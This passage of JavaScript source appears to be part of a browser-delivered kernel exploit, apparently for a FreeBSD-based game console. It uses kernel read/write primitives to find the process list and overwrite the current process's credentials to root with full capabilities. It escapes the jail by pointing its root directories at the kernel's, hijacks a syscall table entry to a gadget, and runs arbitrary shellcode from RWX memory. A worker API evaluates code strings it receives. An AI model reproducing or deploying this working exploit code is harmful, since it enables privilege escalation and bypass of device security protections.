  return kview(fdt_ofiles).getBInt(fd * FILEDESCENT_SIZE, fp, true);
}

function fhold(fp) {
  const f_count = kview(fp).getInt32(0x28, true);
  kview(fp).setInt32(0x28, f_count + 1, true);
}

function get_in6p_outputopts(fd) {
  const fp = fget(fd);
  const f_data = kview(fp).getBInt(0, true);
  const so_pcb = kview(f_data).getBInt(0x18, true);
  return kview(so_pcb).getBInt(0x118, true); // in6p_outputopts
}

function get_pktinfo_from_so(fd) {
  return kview(get_in6p_outputopts(fd)).getBInt(0x10, true); // ip6po_pktinfo
}

function get_rthdr_from_so(fd) {
  return kview(get_in6p_outputopts(fd)).getBInt(0x68, true); // ip6po_rthdr
}

function remove_pktinfo_from_so(fd) {
  kview(get_in6p_outputopts(fd)).setBInt(0x10, 0, true); // ip6po_pktinfo
}

function remove_rthdr_from_so(fd) {
  kview(get_in6p_outputopts(fd)).setBInt(0x68, 0, true); // ip6po_rthdr
}

function inc_karw_pipe_refcnt() {
  fhold(fget(master_pipe[0]));
  fhold(fget(master_pipe[1]));
  fhold(fget(slave_pipe[0]));
  fhold(fget(slave_pipe[1]));
}

function pfind(pid) {
  let p = kview(allproc).getBInt(0, true);
  while (p.neq(0)) {
    const p_pid = kview(p).getInt32(0xb0, true);
    if (p_pid === pid) break;

    p = kview(p).getBInt(0, true); // p_list.le_next
  }

  return p;
}

function find_all_proc() {
  logger.info("Finding allproc...");

  const tmp_pipe = new Array(2);

  const pair_addr = mem.alloc(8);

  if (fn.pipe.invoke(pair_addr) === -1) {
    throw new SyscallError("Unable to create pipe !!");
  }

  tmp_pipe[0] = arw.view(pair_addr).getInt32(0, true);
  tmp_pipe[1] = arw.view(pair_addr).getInt32(4, true);

  mem.free(pair_addr);

  try {
    const pid = fn.getpid.invoke();
    const pid_addr = mem.alloc(4);
    arw.view(pid_addr).setInt32(0, pid, true);

    if (fn.ioctl.invoke(tmp_pipe[0], FIOSETOWN, pid_addr) === -1) {
      throw new SyscallError(`Unable to ioctl fd ${tmp_pipe[0]} !!`);
    }

    mem.free(pid_addr);

    const fp = fget(tmp_pipe[0]);
    const f_data = kview(fp).getBInt(0, true);
    const pipe_sigio = kview(f_data).getBInt(0xd0, true);
    let p = kview(pipe_sigio).getBInt(0, true);

    const mask = new BInt("0xffffffff00000000");
    while (p.and(mask).neq(mask)) {
      p = kview(p).getBInt(8, true); // p_list.le_prev
    }

    allproc = p;
    logger.info(`allproc: ${allproc}`);
  } finally {
    for (const fd of tmp_pipe) {
      if (fd === 0) {
        continue;
      }

      if (fn.close.invoke(fd) === -1) {
        throw new SyscallError(`Unable to close fd ${fd} !!`);
      }
    }
  }
}

function jailbreak() {
  logger.info("Initiate jailbreak...");

  const p = pfind(fn.getpid.invoke());
  const kp = pfind(KERNEL_PID);

  // Patch credentials and capabilities
  const p_ucred = kview(p).getBInt(0x40, true);
  const kp_ucred = kview(kp).getBInt(0x40, true);

  const prison0 = kview(kp_ucred).getBInt(0x30, true);

  kview(p_ucred).setInt32(0x04, 0, true); // cr_uid
  kview(p_ucred).setInt32(0x08, 0, true); // cr_ruid
  kview(p_ucred).setInt32(0x0c, 0, true); // cr_svuid
  kview(p_ucred).setInt32(0x10, 1, true); // cr_ngroups
  kview(p_ucred).setInt32(0x14, 0, true); // cr_rgid
  kview(p_ucred).setInt32(0x18, 0, true); // cr_svgid
  kview(p_ucred).setBInt(0x30, prison0, true); // cr_prison
  kview(p_ucred).setBInt(0x58, SYSCORE_AUTHID, true); // cr_sceAuthId
  kview(p_ucred).setBInt(0x60, -1, true); // cr_sceCaps[1]
  kview(p_ucred).setBInt(0x68, -1, true); // cr_sceCaps[0]
  kview(p_ucred).setUint8(0x83, 0x80); // cr_sceAttr[0]

  // Allow root file system access
  const p_fd = kview(p).getBInt(0x48, true);
  const kp_fd = kview(kp).getBInt(0x48, true);

  const root_vnode = kview(kp_fd).getBInt(0x10, true);

  kview(p_fd).setBInt(0x10, root_vnode, true); // fd_rdir
  kview(p_fd).setBInt(0x18, root_vnode, true); // fd_jdir

  logger.info("Achieved jailbreak !!");
}

// intended for use only after kernel arw
function kernel_patches(shellcode) {
  logger.info("Applying kernel patches...");

  const sysent_661_addr = kernel_base.add(constants.SYSENT_661);
  logger.debug(`sysent_661_addr: ${sysent_661_addr}`);

  const jmp_rsi_gadget_addr = kernel_base.add(constants.JMP_RSI_GADGET);
  logger.debug(`jmp_rsi_gadget_addr: ${jmp_rsi_gadget_addr}`);

  const sy_narg = kview(sysent_661_addr).getUint32(0, true);
  const sy_call = kview(sysent_661_addr).getBInt(8, true);
  const sy_thrcnt = kview(sysent_661_addr).getUint32(0x2c, true);

  logger.debug(`sy_narg: ${sy_narg}`);
  logger.debug(`sy_call: ${sy_call}`);
  logger.debug(`sy_thrcnt: ${sy_thrcnt}`);

  kview(sysent_661_addr).setUint32(0, 2, true);
  kview(sysent_661_addr).setBInt(8, jmp_rsi_gadget_addr, true);
  kview(sysent_661_addr).setUint32(0x2c, 1, true);

  const size = shellcode.length.alignUp(PAGE_SIZE);
  const prot = PROT_READ | PROT_WRITE | PROT_EXEC;
  const flags = MAP_SHARED | MAP_FIXED;

  const exec_fd = fn.jitshm_create.invoke(0, size, prot);
  logger.debug(`exec_fd: ${exec_fd}`);
  if (exec_fd === -1) {
    throw new SyscallError("Unablet to create JIT shared memory with rwx !!");
  }

  const mapping_addr = new BInt(9, 0x20100000);

  if (fn.mmap.invoke(mapping_addr, size, prot, flags, exec_fd, 0).eq(-1)) {
    throw new SyscallError(`Unable to map memory with size ${size} with rwx !!`);
  }

  mem.copy(mapping_addr, shellcode.buffer.data(), shellcode.length);

  const ret = fn.kexec.invoke(mapping_addr);
  logger.debug(`kexec_ret: ${ret}`);
  if (ret === -1) {
    throw new SyscallError(`Unable to kexec ${mapping_addr} !!`);
  }

  kview(sysent_661_addr).setUint32(0, sy_narg, true);
  kview(sysent_661_addr).setBInt(8, sy_call, true);
  kview(sysent_661_addr).setUint32(0x2c, sy_thrcnt, true);

  logger.info("Kernel patches applied !!");
}
//#endregion
//#region Structs
const cpuset = new Struct("cpuset", [
  { type: "Uint64", name: "bits0" },
  { type: "Uint64", name: "bits1" },
]);

const rtprio = new Struct("rtprio", [
  { type: "Uint16", name: "type" },
  { type: "Uint16", name: "prio" },
]);

const in6_addr = new Struct("in6_addr", [{ type: "Uint8", name: "s6_addr", count: 16 }]);

const ip6_rthdr0 = new Struct("ip6_rthdr0", [
  { type: "Uint8", name: "ip6r0_nxt" },
  { type: "Uint8", name: "ip6r0_len" },
  { type: "Uint8", name: "ip6r0_type" },
  { type: "Uint8", name: "ip6r0_segleft" },
  { type: "Uint32", name: "ip6r0_reserved" },
]);

const pipebuf = new Struct("pipebuf", [
  { type: "Uint32", name: "cnt" },
  { type: "Uint32", name: "in" },
  { type: "Uint32", name: "out" },
  { type: "Uint32", name: "size" },
  { type: "Uint64", name: "buffer" },
]);
//#endregion


let marker_arr = new Uint32Array(new ArrayBuffer(0x10));

const api = {
  init(name) {
    self.name = name;
    version.init();
    arw.master = new Uint32Array(6);
    marker_arr.fill(0x41414141);
    marker_arr.leak = arw.leak;
    marker_arr.master = arw.master;
    marker_arr.victim = arw.victim;
    return marker_arr;
  },
  setup(leak_addr, wk_base) {
    marker_arr = null;
    arw.leak_addr = new BInt(leak_addr);
    webkit_base = new BInt(wk_base);
    init_arw();
    init_rop();
    init_syscalls();
    if (typeof init_kernel_fns === "function") init_kernel_fns();
    return true;
  },
  register(name, fn) {
    if (typeof fn !== "string") {
      throw new Error(fn + " not a string !!");
    }
    if (name in api) {
      throw new Error(name + " already registered !!");
    }
    api[name] = new Function("return (" + fn + ")")();
    return true;
  },
  ping() {
    return "pong";
  },
};

self.onmessage = function (e) {
  var id = e.data && e.data.id;
  var name = e.data && e.data.name;
  var args = (e.data && e.data.args) || [];
  try {
    var fn = api[name];
    if (typeof fn !== "function") {
      throw new Error("Unknown function " + name);
    }
    var ret = fn.apply(null, args);
    if (name === "init" && ret && ret.buffer) {
      self.postMessage({ id: id, type: "ret", value: ret }, [ret.buffer]);
    } else {
      self.postMessage({ id: id, type: "ret", value: ret });
    }
  } catch (err) {
    self.postMessage({
      id: id,
      type: "err",
      value: {
        message: err && err.message ? err.message : String(err),
        stack: err && err.stack ? err.stack : "",
      },
    });
  }
};
